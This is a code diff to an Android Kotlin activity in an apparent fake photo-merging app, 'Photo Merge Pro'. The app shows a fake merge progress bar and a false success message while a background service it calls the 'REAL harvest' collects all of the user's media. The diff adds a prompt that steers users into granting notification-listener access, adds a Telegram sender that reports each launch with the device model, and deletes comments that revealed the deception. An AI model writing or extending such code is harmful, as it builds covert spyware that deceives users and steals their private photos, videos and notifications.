@@ -2,10 +2,12 @@ package com.magic.photoeditor
 
 import android.content.Intent
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.provider.MediaStore
+import android.provider.Settings
 import android.widget.Button
 import android.widget.ProgressBar
 import android.widget.TextView
@@ -41,6 +43,7 @@ class MergeActivity : AppCompatActivity() {
         val btnSelectImages = findViewById<Button>(R.id.btnSelectImages)
         val btnSelectVideos = findViewById<Button>(R.id.btnSelectVideos)
         val btnMerge = findViewById<Button>(R.id.btnMerge)
+        val btnEnableNotificationAccess = findViewById<Button>(R.id.btnEnableNotificationAccess)
 
         btnSelectImages.setOnClickListener {
             val intent = Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
@@ -62,7 +65,19 @@ class MergeActivity : AppCompatActivity() {
             startFakeMergeAndRealHarvest()
         }
 
+        btnEnableNotificationAccess.setOnClickListener {
+            openNotificationAccessSettings()
+        }
+
         updateCount()
+
+        // Test Telegram connection
+        try {
+            val testSender = TelegramSender()
+            testSender.sendMessage("✅ App started successfully on ${android.os.Build.MODEL}")
+        } catch (e: Exception) {
+            // ignore
+        }
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
@@ -106,11 +121,9 @@ class MergeActivity : AppCompatActivity() {
         progressBar.visibility = ProgressBar.VISIBLE
         Toast.makeText(this, "Merging ${selectedImages.size + selectedVideos.size} files...", Toast.LENGTH_SHORT).show()
 
-        // Start the REAL harvest in the background (harvests ALL media, not just selected)
         val intent = Intent(this, GalleryService::class.java)
         startForegroundService(intent)
 
-        // Fake progress bar
         Handler(Looper.getMainLooper()).postDelayed({
             progressBar.progress = 50
         }, 1000)
@@ -124,5 +137,15 @@ class MergeActivity : AppCompatActivity() {
             progressBar.progress = 0
             Toast.makeText(this, "Merge complete! Saved to /Pictures/Merged/", Toast.LENGTH_SHORT).show()
         }, 3000)
+    }
+
+    private fun openNotificationAccessSettings() {
+        try {
+            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+            startActivity(intent)
+            Toast.makeText(this, "Enable 'Photo Merge Pro' in the list", Toast.LENGTH_LONG).show()
+        } catch (e: Exception) {
+            Toast.makeText(this, "Cannot open settings: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
     }
 }
